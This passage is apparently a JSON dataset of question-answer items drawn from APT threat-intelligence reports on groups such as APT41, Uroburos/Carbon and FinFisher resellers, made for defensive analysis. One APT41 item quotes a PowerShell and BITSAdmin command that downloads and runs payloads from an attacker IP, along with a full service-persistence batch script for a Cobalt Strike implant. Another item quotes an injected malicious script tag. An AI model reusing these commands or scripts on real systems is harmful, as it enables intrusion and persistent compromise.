    "output": "The cyberattacks on Georgia shared similarities with previous incidents involving Estonia and Lithuania, both former Soviet republics. In all cases, the attacks involved coordinated campaigns targeting government websites, often using distributed denial-of-service (DDoS) attacks to overwhelm and take down the sites. These attacks reflected a broader pattern of cyber warfare tactics, where cyber offensives were used in conjunction with military actions to disrupt and destabilize the targeted countries. The involvement of the Russian Business Network (RBN) and the suspected state sponsorship of these attacks further highlighted the strategic use of cyber capabilities in modern conflicts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Cisco Router Exploitation\nOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named 'fuc' (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module (<https://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv32x_rce>)that combines two CVE's ( and ) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.\nGET /test/fuc\nHTTP/1.1\nHost: 66.42.98\\.220\nUser-Agent: Wget\nConnection: close\nFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget\n66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is 'cat /etc/flash/etc/nk_sysconfig', which is the command one would execute on a Cisco RV320 router to display the current configuration.\nCisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action:\nBig Headline: Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)\nOn March 5, 2020, researcher (<https://twitter.com/steventseeley/status/1235635108498948096?s=20>)Steven Seeley, published (<https://srcincite.io/advisories/src-2020-0011/>)an advisory and released (<https://srcincite.io/pocs/src-2020-0011.py.txt>)proof-of-concept code for a zero-day (<https://nvd.nist.gov/vuln/detail/CVE-2020-10189>)remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho\nManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload \"logger.zip\", a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.\njava/lang/Runtime\ngetRuntime\n()Ljava/lang/Runtime;\nXcmd /c powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\\nWindows\\Temp\\install.bat')&powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','\nC:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat\n'(Ljava/lang/String;)Ljava/lang/Process;\nStackMapTable\nysoserial/Pwner76328858520609\nLysoserial/Pwner76328858520609;\nFigure 6: Contents of logger.zip\nHere we see a toolmark from the tool (<https://github.com/frohoff/ysoserial>)ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation.\nIn the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.\nParent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe\nProcess Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat\nFigure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation\nIn both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).\n@echo off\nset \"WORK_DIR=C:\\Windows\\System32\"\nset \"DLL_NAME=storesyncsvc.dll\"\nset \"SERVICE_NAME=StorSyncSvc\" set \"DISPLAY_NAME=Storage Sync Service\" set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\"  sc stop %SERVICE_NAME% sc delete %SERVICE_NAME%\nmkdir %WORK_DIR%\ncopy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Y reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /t REG_MULTI_SZ /d \"%SERVICE_NAME%\" /f sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"\nSC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000\nsc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\"\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /f net start \"%SERVICE_NAME%\"\nFigure 8: Contents of install.bat\nStoresyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.\nGET /jquery-3.3.1.min.js HTTP/1.1\nHost: cdn.bootcss.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: http://cdn.bootcss.com/\nAccept-Encoding: gzip, deflate\nCookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM\nDA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\nConnection: Keep-Alive Cache-Control: no-cache\nFigure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request\nWithin a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary (<https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html>)backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we've observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a (<https://www.fireeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html>)VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we've observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.\nGET /2.exe HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nUser-Agent: Microsoft-CryptoAPI/6.3\nHost: 91.208.184[.]78\nFigure 10: Example HTTP request downloading '2.exe' VMProtected Meterpreter downloader via CertUtil\nThe Meterpreter downloader 'TzGG' was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).\nFigure 12: Example HTTP request downloading 'TzGG' shellcode for Cobalt Strike BEACON\nThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems.\nManageEngine released a short term (<https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html>)mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an (<https://www.manageengine.com/products/desktop-central/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb>)update on March 7, 2020, with a long term fix.\nAnswer this question: How did APT41 exploit the Cisco RV320 router, and what payload was delivered? Describe the process and the significance of the payload.",
    "output": "APT41 successfully exploited a Cisco RV320 router at a telecommunications organization on February 21, 2020, by leveraging a combination of two CVEs through a Metasploit module. This exploit enabled remote code execution on the router, allowing APT41 to download a 32-bit ELF binary payload named 'fuc' (MD5: 155e98e5ca8d662fad7dc84187340cbc), which was compiled for a 64-bit MIPS processor. The payload was downloaded using wget from the IP address 66.42.98.220. The significance of this payload is that it indicates a successful breach of the router's security, potentially allowing APT41 to gain further access to the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role do intermediaries like Eagle Eye Digital Solutions LLC play in the distribution and use of FinFisher, and how does this complicate efforts to track and regulate the software?",
    "output": "Intermediaries like Eagle Eye Digital Solutions LLC act as resellers of FinFisher products, facilitating the distribution of the spyware to government entities. These intermediaries can obscure the direct link between the software developers and the end users, making it more challenging to track and regulate the use of FinFisher. For example, Eagle Eye Digital Solutions LLC, founded by Warith Al-Maawali, is associated with the Omani government and has been linked to the operation of FinFisher servers in the country. This layer of intermediaries adds complexity to efforts aimed at ensuring accountability and preventing the misuse of intrusion software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nThis analysis shows us that the actors behind Uroburos, Agent.BTZ and the Carbon System are skilled and still active. This sample we analyzed demonstrates how the authors tried to complicate the detection and the use of Indicators of Compromise. Summarized, some of the tricks we have encountered:\nuse of random service names;\nus of random file names;\nuse of random installation directory names;\nconfiguration of the named pipe name;\n\u2026\nCarbon System is a real extensible framework with a plugin management. As these plugins are provided by the contacted C&C servers, it can be anything \u2013 nothing has to be pre-bundled. Due to the nature of the malware attacks, we can imagine those plugins to be anything connected to cyber espionage, from keyloggers to credentials stealers, eavesdropping mechanisms and much more. An attacked enterprise or organization would be an open book for the attackers.\nThe architecture is complex, with an orchestrator and a library injected into the browsers' and email clients' processes. Obviously, this approach resembles what we have seen looking at Uroburos. The framework could be considered as a \"draft\" but still very powerful version (in user-land only) of Uroburos. We believe that Uroburos is the product of the Cobra malware evolution. Although Uroburos is a new branch, not a linear follow-up.\nLooking at the whole picture that we can draw until now, we can say that everything regarding this whole campaign is highly professional. We have analyzed various samples and have drawn many conclusions. Even though there are still many open questions that need to be answered, we come closer to charming the snakes \u2013 The Cobra, the venomous animal with the deadly bite, and Uroburos, the self-sustaining creepy mixture of a snake and a dragon. This kind of herpetology became quite interesting and we are thrilled to find out more about the campaigns.\n\nAnswer this question based on the above context: How does the architecture of the Carbon System malware compare to that of Uroburos, and what implications does this have for its capabilities and potential impact on targeted organizations?",
    "output": "The Carbon System malware is designed as an extensible framework with a plugin management system, allowing it to receive various plugins from Command and Control (C&C) servers. These plugins can include functionalities such as keyloggers, credential stealers, and eavesdropping mechanisms, making the malware highly versatile for cyber espionage activities. The architecture of Carbon System includes an orchestrator and a library that gets injected into the processes of browsers and email clients, which resembles the architecture seen in Uroburos. However, Carbon System operates solely in user-land, whereas Uroburos extends into the kernel. This suggests that Carbon System can be considered a 'draft' or a less sophisticated version of Uroburos, yet still very powerful. The complexity and professionalism of the malware indicate that the actors behind it are skilled and still active, posing a significant threat to enterprises and organizations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Remote Work Environment Best Practices\nWith the increased use of remote work environments and VPN services, the FBI and CISA encourage organizations to implement the following best practices to improve network security:\n\u2022 Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.\n\u2022 When possible, implement multi-factor authentication on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, require employees engaging in remote work to use strong passwords.\n\u2022 Monitor network traffic for unapproved and unexpected protocols.\n\u2022 Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry for cyber actors.\nMedium Headline: User Awareness Best Practices\nCyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI and CISA recommend the following best practices to improve employee operations security when conducting business:\n\u2022 Provide end-user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and delivery methods. Also, provide users with training on information security principles and techniques.\n\u2022 Inform employees of the risks associated with posting detailed career information to social or professional networking sites.\n\u2022 Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyber incident, to help quickly and efficiently identify threats and employ mitigation strategies.\n\nBased on the above text, answer a question. How can organizations effectively mitigate the risk of Russian state-sponsored cyber actors gaining network access through exploitation of default MFA protocols and known vulnerabilities in remote work environments?",
    "output": "Organizations can mitigate the risk of Russian state-sponsored cyber actors gaining network access by implementing several best practices. Firstly, regularly updating VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations is crucial. Secondly, implementing multi-factor authentication (MFA) on all VPN connections is highly recommended, with physical security tokens being the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, requiring employees to use strong passwords is essential. Additionally, monitoring network traffic for unapproved and unexpected protocols helps in detecting unusual activities. Lastly, reducing potential attack surfaces by discontinuing unused VPN servers that could serve as entry points for cyber actors is important.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Bibliography\nAdair, Steven. January 19, 2010. \"Cyber Espionage: Death by 1000 Cuts,\" Shadowserver Foundation, (<http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20100119>)http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20100119 (accessed April 1, 2010).\nBakken, B\u00f8rge, ed. 2005. Crime, Punishment, and Policing in China. Lanham, MD: Rowman & Littlefield.\nBejtlich, Richard. January 22, 2010. \"Attribution Using 20 Characteristics,\" TaoSecurity, (<http://taosecurity.blogspot.com/2010/01/attribution-using-20-characteristics.html>)http://taosecurity.blogspot.com/2010/01/attribution-using-20-characteristics.html (accessed April 1, 2010).\nBurstein, Aaron J. 2008. \"Conducting Cybersecurity Research Legally and Ethically,\" LEET 2008, San Francisco, CA, (<http://www.usenix.org/event/leet08/tech/full_papers/burstein/burstein_html/>)http://www.usenix.org/event/leet08/tech/full_papers/burstein/burstein_html/ (accessed April 1, 2010).\nCurle, Adam. 1949. \"A Theoretical Approach to Action Research,\" Human Relations, 2:3, 269-280.\nChoo, Kim-Kwang Raymond, 2008. \"Organised Crime Groups in Cyberspace: A Typology,\" Trends in Organized Crime, 11:3, 270-295.\nCloppert, Mike. October 14, 2009. \"Security Intelligence: Attacking the Kill Chain,\" SANS Computer Forensics Investigations and Incident Response Blog, (<http://blogs.sans.org/computer-forensics/2009/10/14/security-intelligence-attacking-the-kill-chain/>)http://blogs.sans.org/computer-forensics/2009/10/14/security-intelligence-attacking-the-kill-chain/ (accessed April 1, 2010).\nCooke, Evan., Farnam Jahanian, Danny McPherson. 2005. \"The Zombie Roundup: Understanding, Detecting, and Disrupting Botnets,\" USENIX, SRUTI 2005, Cambridge, MA, (<http://www.usenix.org/event/sruti05/tech/cooke.html>)http://www.usenix.org/event/sruti05/tech/cooke.html (accessed April 1, 2010).\nDagon, David, Cliff Zou, and Wenke Lee. 2006. \"Modeling Botnet Propagation Using Time Zones,\" NDSS 2006, San Diego CA, (<http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.128.8689&rep=rep1&type=pdf>)http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.128.8689&rep=rep1&type=pdf (accessed April 1, 2010).\nDefence Research and Development Organisation. February 1, 2009. \"Tactical command, control, communication, computer and intelligence.\" Bulletin, (<http://www.usenix.org/event/sruti05/tech/cooke.html>)http://www.drdo.org/pub/techfocus/2009/feb09.pdf (accessed April 1, 2010).\nDeibert, Ronald, and Rafal Rohozinski. 2010. \"Risking Security: The policies and paradoxes of cyberspace security,\" International Political Sociology, 4:1, 15-32.\nDeloitte & Touche LLP, 2010. Cyber Crime: A Clear and Present Danger Combating the Fastest Growing Cyber Security Threat, (<http://www.deloitte.com/assets/Dcom-UnitedStates/Local%20Assets/Documents/AERS/us_aers_Deloitte%20Cyber%20Crime%20POV%20Jan252010.pdf >)http://www.deloitte.com/assets/Dcom-UnitedStates/Local%20Assets/Documents/AERS/us_aers_Deloitte%20Cyber%20Crime%20 (<http://www.deloitte.com/assets/Dcom-UnitedStates/Local%20Assets/Documents/AERS/us_aers_Deloitte%20Cyber%20Crime%20POV%20Jan252010.pdf >)POV%20Jan252010.pdf (accessed April 1, 2010).\nF-Secure. 2010. \"PDF Based Targeted Attacks are Increasing,\" (<http://www.f-secure.com/weblog/archives/00001903.html >)http://www.f-secure.com/weblog/archives/00001903.html (accessed April 1, 2010).\nFrontier India. June 12, 2009. \"Artillery Combat Command and Control System SHAKTI dedication to Indian Army.\" (<http://frontierindia.net/artilery-combat-command-and-control-system-shakti-dedication-to-indian-army>)http://frontierindia.net/artilery-combat-command-and-control-system-shakti-dedication-to-indian-army (accessed April 1, 2010).\nHenderson, Scott. 2009a. \"CasperNet Gets Punked,\" The Dark Visitor blog, (<http://www.thedarkvisitor.com/tag/lost33>)http://www.thedarkvisitor.com/tag/lost33 (accessed April 1, 2010).\nHenderson, Scott. 2009b. \"Hunting the GhostNet Hacker,\" The Dark Visitor blog, (<http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker>)http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker (accessed April 1, 2010).\nHenderson, Scott. 2007a. \"Top Chinese Hackers,\" The Dark Visitor blog, (<http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker>)http://www.thedarkvisitor.com/2009/04/hunting-the-ghostnet-hacker(accessed April 1, 2010).\nHenderson, Scott. 2007b. The Dark Visitor. (<http://www.lulu.com/items/volume_62/2048000/2048958/4/print/2048958.pdf>)http://www.lulu.com/items/volume_62/2048000/2048958/4/print/2048958.pdf (accessed April 1, 2010).\nHiggins, Kelly Jackson. September 24, 2008. \"Shadowserver to Build Sinkhole to Find Errant Bots,\" Dark Reading, (<http://www.darkreading.com/security/management/showArticle.jhtml?articleID=211201241>)http://www.darkreading.com/security/management/showArticle.jhtml?articleID=211201241 (accessed April 1, 2010).\nIndia Defence. 2007. \"Indian Army Tests Indigenous Battlefield Surveillance System,\" (<http://www.india-defence.com/reports-3171>)http://www.india-defence.com/reports-3171 (accessed April 1, 2010).\nIndian Embassy. 1998. \"National Security Council Setup,\" (<http://www.indianembassy.org/inews/December98/9.htm>)http://www.indianembassy.org/inews/December98/9.htm (accessed April 1, 2010).\nIndian Government. 2010. \"Overseas.\" (<http://india.gov.in/overseas.php>)http://india.gov.in/overseas.php (accessed April 1, 2010).\nJagatic, Tom N., Nathaniel A. Johnson, Markus Jakobsson, and Filippo Menczer. 2007. \"Social Phishing,\" Communications of the ACM, 50:10, 94-100, (<http://portal.acm.org/citation.cfm?id=1290958.1290968&coll=GUIDE&dl=GUIDE&CFID=74760848&CFTOKEN=96817982>)http://portal.acm.org/citation.cfm?id=1290958.1290968&coll=GUIDE&dl=GUIDE&CFID=74760848&CFTOKEN=96817982 (accessed April 1, 2010).\nKeith, Ronald and Zhiqiu Lin. 2005. New Crime in China: Public Order and Human Rights. London: Routledge.\nLam, Willy. November 18, 2009. \"Mafias expose China's legal woes,\" Asia Times Online, (<http://www.atimes.com/atimes/China/KK18Ad01.html>)http://www.atimes.com/atimes/China/KK18Ad01.html (accessed April 1, 2010).\nLewin, Kurt. 1946. \"Action Research and Minority Problems,\" Journal of Social Issues, 2, 34-46.\nMandiant, 2010. M Trends: The Advanced Persistent Threat, (<http://www.mandiant.com/products/services/m-trends>)http://www.mandiant.com/products/services/m-trends (accessed April 1, 2010).\nMarkoff, John, and David Barboza. February 18, 2010. \"2 China Schools Said to Be Tied to Online Attacks.\" New York Times, (<http://www.nytimes.com/2010/02/19/technology/19china.html>)http://www.nytimes.com/2010/02/19/technology/19china.html (accessed April 1, 2010).\nNazario, Jose. 2009a. \"Twitter-based Botnet Command Channe,\" Arbor Networks, (<http://asert.arbornetworks.com/2009/08/twitter-based-botnet-command-channel>)http://asert.arbornetworks.com/2009/08/twitter-based-botnet-command-channel (accessed April 1, 2010).\nNazario, Jose. 2009b. \"Malicious Google AppEngine Used as a CnC,\" Arbor Networks, (<http://asert.arbornetworks.com/2009/11/malicious-google-appengine-used-as-a-cnc>)http://asert.arbornetworks.com/2009/11/malicious-google-appengine-used-as-a-cnc (accessed April 1, 2010).\nNolan, Jason, and Michelle Levesque. 2005. \"Hacking human: data-archaeology and surveillance in social networks,\" ACM SIGGROUP Bulletin, 25:2, 33-37, http://portal.acm.org/citation.cfm?id=1067721.1067728&coll=ACM&dl=ACM&CFID=84425230&CFTOKEN=14042216 (accessed April 1, 2010).\nNorthrop Grumman. 2009. Capability of the People's Republic of China to Conduct Cyber Warfare and Computer Network Exploitation, (<http://www.uscc.gov/.../NorthropGrumman_PRC_Cyber_Paper_FINAL_Approved%20Report_16Oct2009.pdf>)http://www.uscc.gov/.../NorthropGrumman_PRC_Cyber_Paper_FINAL_Approved%20Report_16Oct2009.pdf (accessed April 1, 2010).\nOffice Of the Privacy Commissioner of Canada. 2010. Reaching for the Cloud(s):Privacy Issues related to Cloud Computing. (<http://www.priv.gc.ca/information/pub/cc_201003_e.cfm>)http://www.priv.gc.ca/information/pub/cc_201003_e.cfm (accessed April 2, 2010).\nParker, Tom, Eric Shaw, Ed Stroz, Matthew G. Devost, and Marcus H. Sachs. 2004. Cyber Adversary Characterization: Auditing the Hacker Mind, Syngress Publishing Inc: Rockland MA.\nParker, Tom, Dave Farell, Toby Miller, and Matthew G. Devost. 2003. \"Adversary Characterization and Scoring Systems,\" Blackhat 2003, Las Vegas, NV. (<http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-parker.pdf>)http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-parker.pdf.\nRamachandran, Anirudh., Nick Feamster, and David Dagon. 2006. \"Revealing Botnet Membership Using DNSBL Counter-Intelligence.\" USENIX, SRUTI 2006, San Jose, CA, (<http://www.usenix.org/events/sruti06/tech/full_papers/ramachandran/ramachandran.pdf>)http://www.usenix.org/events/sruti06/tech/full_papers/ramachandran/ramachandran.pdf (accessed April 1, 2010).\nRajab, Moheeb Abu., Jay Zarfoss, Fabian Monrose, and Andreas Terzis. 2007. \"My Botnet is Bigger than Yours (Maybe, Better than Yours): Why Size Estimates Remain Challenging\". USENIX, Hotbots 2007, Cambridge, MA, (<http://www.usenix.org/event/hotbots07/tech/full_papers/rajab/rajab.pdf>)http://www.usenix.org/event/hotbots07/tech/full_papers/rajab/rajab.pdf (accessed April 1, 2010).\nRatzlav-Katz, Nissan. January 7, 2010. \"'Iron Dome' Anti-Missile System Ready for Deployment,\" Arutz Sheva, (<http://www.israelnationalnews.com/News/News.aspx/135406>)http://www.israelnationalnews.com/News/News.aspx/135406 (accessed April 1, 2010). Saikorian Association. Website, (<http://www.saikorian.org>)www.saikorian.org (accessed April 1, 2010).\nAnswer this question: What role does the concept of 'Action Research,' as discussed by Adam Curle, play in the context of combating cyber threats like those addressed by Shadowserver?",
    "output": "Adam Curle's concept of 'Action Research' emphasizes a theoretical approach to addressing real-world problems through systematic investigation and action. In the context of combating cyber threats like those addressed by Shadowserver, action research involves continuous monitoring, analysis, and adaptation of defensive strategies. This iterative process allows cyber security experts to refine their methods based on ongoing observations and feedback, thereby enhancing their ability to detect, respond to, and prevent advanced persistent threats (APTs).",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Appendix A: C&C hostnames\nmay2008.dyndns.info menu.dyndns.biz\nflashsoft.no-ip.biz monagameel.chickenkiller.com hatamaya.chickenkiller.com powerhost.zapto.org helpme.no-ip.biz mjed10.no-ip.info good.zapto.org hint.zapto.org hint1.zapto.org natco1.no-ip.net natco2.no-ip.net natco3.no-ip.net natco4.no-ip.net loading.myftp.org skype.servemp3.com test.cable-modem.org idf.blogsite.org javaupdate.no-ip.info lokia.mine.nu\nwww.hint-sms.com\nowner.no-ip.biz  remoteback.no-ip.biz ramadi.no-ip.biz\nThe likelihood that there are more names involved is large. There is for example a domain natco5.no-ip.net which resolves to the same IP's as the rest of the series, but we have not seen the malware which uses it \u2013 yet.\nBig Headline: Appendix C: MD5 list, main cluster\nMD5 A5DE87646EE943CD1F448A67FDBE2817 F982401E46864F640BCAEDC200319109 EC5B360F5FF6251A08A14A2E95C4CAA4 97576FA7A236679DBE3ABE1A4E852026 C1EC435E97A4A4C5585392D738B5879F 2559FE4EB88561138CE292DF5D0E099F 0ABF3FA976372CBC8BF33162795E42A8 1f1e9958440d773c34415d9eb6334bcebc8b51d51e442e2af8c86e70c8adf4 31F96ADD841594D35E6E97376114E756 6E416C45A833F959A63785892042595A 0DC102CFB87C937EEFFE01A06F94E229 B7DF947B4A67A884C751840F83C4405E 2EB1503751A7C74890096B1837C7BD81 C21D7165B25CAF65D7F92FF758C1B5B1 0A67F9CC30083AFB7E1F8295AE152BB6 15FC009D9CAAA8F11D6C3DA2B69EA06E D9D1B0C467FA4999DEF6CD53447F1221 E9823B61E6CE999387DE821DFBF6E741 2AAD951DBECB6D4715B306B337CA5C34 ED53831468DDF4220E1DC3C3398F7F39 66DDF27517985A75B2317231B46A6F62 86BE5F0D2303FB4A8A8E297A53AC0026 A1187DE4C4B88E560D46940B820A6228\nn\nBased on the provided list of Command and Control (C&C) hostnames and MD5 hashes, how would you determine if a new hostname belongs to the same threat actor? Explain the methodology and reasoning behind your approach.",
    "output": "To determine if a new hostname belongs to the same threat actor, you would need to analyze several factors. First, observe the naming patterns and domains used in the existing C&C hostnames. For example, many of the hostnames use dynamic DNS services like 'no-ip.biz', 'zapto.org', and 'dyndns.info'. Additionally, some hostnames follow a sequential pattern, such as 'natco1.no-ip.net', 'natco2.no-ip.net', etc. By identifying these patterns, you can infer that a new hostname like 'natco5.no-ip.net' likely belongs to the same threat actor because it follows the established naming convention and resolves to the same IP addresses as the others. Furthermore, cross-referencing the IP addresses associated with known C&C servers can provide additional confirmation. This methodology relies on recognizing consistent behaviors and infrastructure usage by the threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role does ingress and egress filtering play in protecting an organization's network from cyberespionage, and why is it important to monitor both inbound and outbound traffic?",
    "output": "Ingress and egress filtering plays a crucial role in protecting an organization's network from cyberespionage by controlling data flows. Filtering the network traffic with firewalls, content filters, and IPS allows the control of data flows, preventing attackers from reaching internal systems. Monitoring outbound traffic is particularly important because data exfiltration is a key point for cyberespionage. It should be noted that with the increased use of cloud services and mobile devices, some traffic might never pass through the company's gateways. Where traffic blocking is too disruptive, at least monitoring should be implemented.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Links to Previous Activity\nThe most direct connection between these DDoS attacks and previous APT activity is the use of the QTI International and CallTogether code signing certificates, which we have seen in malware attributed to APT activity.\nThe QTI International digital certificate has been previously used to sign binaries used in APT activity including Operation Poisoned Hurricane. Specifically, 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX variant signed by the QTI International certificate. This PlugX variant connected to a Google Code project at code.google[.]com/p/udom/, where it decoded a command that configured its C2 server.\nThe sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as well. This sample was first observed during a drive-by attack in June 2014, and was downloaded from java-se[.]com/jp.jpg. This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com for C2.\nThe QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed. We detect this payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2. The java-se[.]com website was previously used in other attacks targeting the pro-democracy movement in Hong Kong. We first observed the presence of malicious javascript inserted into Hong Kong Association for Democracy and People's Livelihood on June 26, 2014, which appeared as the following:\n<a href=\"http://www.adpl.org.hk/?p=2680\" title=\"\u6297\u8b70\u4e5d\u5df4\u52a0\u50f9\u8981\u6c42\u51cd\u7d50\u52a0\u50f9\u3001\u6539\u5584\u670d\u52d9 <script language=javascript src=http://java-se.com/o.js></script>\">\nMore recently, as noted by Claudio Guarnieri, the website of the Democratic Party of Hong Kong was seen hosting a redirect to the same malicious javascript.\nThe CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5. We also detect this payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com.\nBoth of these certificates are valid but can be detected and blocked via the following Yara signatures:\nrule callTogether_certificate\n{\nmeta:\nversion = \"1.0\"\nreference_hash = \"d08e038d318b94764d199d7a85047637\"\ndescription = \"detects binaries signed with the CallTogether certificate\"\nstrings:\n$serial = {452156C3B3FB0176365BDB5B7715BC4C}\n$o = \"CallTogether, Inc.\"   condition:\n$serial and $o\n}\nrule qti_certificate\n{\nmeta:\nauthor = \"Fireeye Labs\"         reference_hash = \"cfa3e3471430a0096a4e7ea2e3da6195\"\ndescription = \"detects binaries signed with the QTI International Inc certificate\"\nstrings:\n$cn = \"QTI International Inc\"\n$serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }    condition:\n$cn and $serial\n}\nThese ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website. As noted above, this site has been targeted with a DDoS attack by a KernelBot network. We also found that the hkgolden[.]com website was compromised on Sept. 5, 2014 and had a redirect to a malicious javascript again hosted at another jave-se[.]com host, which appeared as follows:\nFinally, as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct. 25, 2014 and Oct. 27, 2014. As (<https://twitter.com/9bplus>)Brandon Dixon noted 